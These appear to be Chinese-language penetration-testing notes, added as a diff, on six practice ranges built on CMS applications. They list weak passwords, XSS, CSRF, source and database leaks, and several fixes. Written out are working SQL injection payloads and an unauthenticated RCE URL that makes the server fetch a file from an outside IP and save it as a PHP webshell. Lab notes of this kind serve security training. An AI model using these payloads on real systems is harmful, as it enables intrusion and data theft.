@@ -1,0 +1,105 @@
+靶场01
+//登录页面弱口令 admin 123456    无验证码
+
+
+
+
+<shiro.version>1.9.0</shiro.version>   CVE-2022-32532权限绕过  暂未复现,但建议升级到最新版本
+//http://tim-s311hyw.gxalabs.com/#/system/user/index存在CSRF
+//用户管理界面存在普通用户越权创建超级管理员用户
+
+
+靶场02
+//后台登录页面弱口令 admin 123456   
+攻击者轻松登陆后台，盗取内部人员信息、公司运营信息、添加管理员账户
+
+
+
+//几乎所有输入字符串的输入点都存在XSS漏洞
+//验证码前端验证
+
+验证码在后端生成、后端验证，且每个验证码只能使用一次
+
+
+//会员修改资料水平越权
+
+
+靶场03
+
+//http://xdcms-s311hyw.gxalabs.com/.git/config    源码泄露
+//http://xdcms-s311hyw.gxalabs.com/system/        目录遍历
+
+//http://xdcms-s311hyw.gxalabs.com/xdcms.sql数据库泄露
+
+//后台登录页面sql注入
+查库名:username=admin' OR UPDATExml(1,concat('~',(database())),0)--+&password=123&verifycode=d9b5&button=
+查表:username=admin' OR UPDATExml(1,concat('~',(SELECT+group_concat(table_name)+frOm+information_scheMA.tables+whEre+table_schema+like+'xdcms')),0)--+&password=123&verifycode=d9b5&button=
+使用安全的数据库连接方式
+使用成熟的防注入框架
+预编译SQL语句
+不直接拼接前端提交的内容
+
+
+
+
+//管理员登录弱口令 xdcms  xdcms(弱口令登录后台可备份数据库,导出暂未验证)
+
+//验证码可重用
+
+//存储型XSS   http://xdcms-s311hyw.gxalabs.com/index.php?m=xdcms&c=index文件管理->URL规则管理
+盗取cookie、修改页面内容、恶意弹窗、广告、js挖矿等
+将前端提交的特殊字符(尖括号、单双引号等在入库前先进行HTML实体化编码
+后端向前端返回的内容中包含特殊字符的，先进行HTML实体化编码再返回
+开启http-only
+
+
+靶场04
+//弱口令
+
+//用户名可遍历
+
+
+//未授权RCE getshell
+/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=copy(%27http://172.16.105.240/a.txt%27,%27a.php%27)
+
+
+
+//源码泄露http://opensns-s311hyw.gxalabs.com/.git/config
+
+//备份文件泄露:http://opensns-s311hyw.gxalabs.com/Data/Backup/
+//目录遍历
+
+//文件上传getShell
+
+
+靶场05
+
+//弱口令
+
+//修改数据库备份文件后上传,突破文件上传格式限制getshell
+https://blog.csdn.net/solitudi/article/details/117427509
+
+
+
+
+SQL注入
+http://emlog-s311hyw.gxalabs.com/admin/comment.php?action=delbyip&token=d07b467cd6493e6f924f4ddbf6aba150&ip='
+
+XSS
+
+
+
+靶场06
+
+//弱口令
+//修改模块造成RCE
+//上传恶意插件getshell
+//目录遍历下载文件,
+//添加管理员帐户CSRF 漏洞
+修改密码时需要验证旧密码
+进行修改密码操作是需要输入验证码(图形验证码、邮箱验证码、短信验证码等)验证
+修改信息或密码时后端编写正确完备的正则表达式验证referer是否来自修改信息页面
+修改信息和密码的功能添加token验证防止CSRF攻击
+开启http-only
+
+
